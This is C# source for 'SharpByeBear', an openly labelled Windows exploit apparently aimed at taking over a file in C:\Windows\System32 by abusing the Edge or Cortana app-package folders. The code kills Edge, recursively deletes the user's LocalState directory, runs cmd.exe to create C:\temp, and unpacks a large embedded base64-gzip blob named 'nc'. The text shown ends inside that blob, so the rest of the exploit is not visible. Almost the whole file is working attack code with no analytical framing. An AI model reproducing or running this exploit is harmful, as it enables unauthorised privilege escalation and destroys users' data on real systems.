using System;
using System.IO;
using NtApiDotNet;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using System.IO.Compression;
using System.Diagnostics;

namespace SharpByeBear
{
    class Exploit
    {

        [DllImport("kernel32.dll")]
        static extern bool SetThreadPriority(IntPtr hThread, ThreadPriority nPriority);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();


        static void Main(string[] args)
        {

            if (args.Length < 2)
            {
                Console.WriteLine("[+] Specify a target filename + Option 1 or 2");
                Console.WriteLine("[-] For example SharpByeBear.exe license.rtf 1");
                Console.WriteLine("[-] Option1: Edge");
                Console.WriteLine("[-] Option2: Cortana");
                return;
            }

            string filename = args[0];
            string path = $@"C:\Windows\System32\{filename}";
            string arg2 = args[1];
            Console.WriteLine(arg2);
            int option = 0;
            option = int.Parse(arg2);
            option = Convert.ToInt32(arg2);
            String LocalState;

            switch (option)
            {
                case 1:
                    Console.WriteLine("Using Edge option");

                    KillEdge();
                    LocalState = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\LocalState";
                    Console.WriteLine($"[+] Removing {LocalState}");
                    try
                    {
                        Directory.Delete($@"{LocalState}", true);
                    }

                    catch { }
                    break;
                case 2:
                    Console.WriteLine("Using Cortana option");

                    if (GetCortana() == 0)
                    {
                        Console.WriteLine("[+] Cortana disabled");
                        return;
                    }

                    string AppData = Environment.GetFolderPath((Environment.SpecialFolder.LocalApplicationData));
                    LocalState = AppData + $@"\packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState";

                    Console.WriteLine($"[+] Removing {LocalState}");


                    try
                    {
                        Directory.Delete($@"{LocalState}", true);
                    }


                    catch { }
                    break;
                default:
                    Console.WriteLine("Invalid Option");
                    return;
            }


            if (!File.Exists(path))
            {
                Console.WriteLine(" [x] File does not exist");
                return;
            }

            string temporary = @"C:\temp";
            if (!File.Exists(temporary))
            {
                string createtemp = @" /C mkdir C:\temp";
                System.Diagnostics.Process.Start("CMD.exe", createtemp);
            }

            var nc = DecompressFile(Convert.FromBase64String("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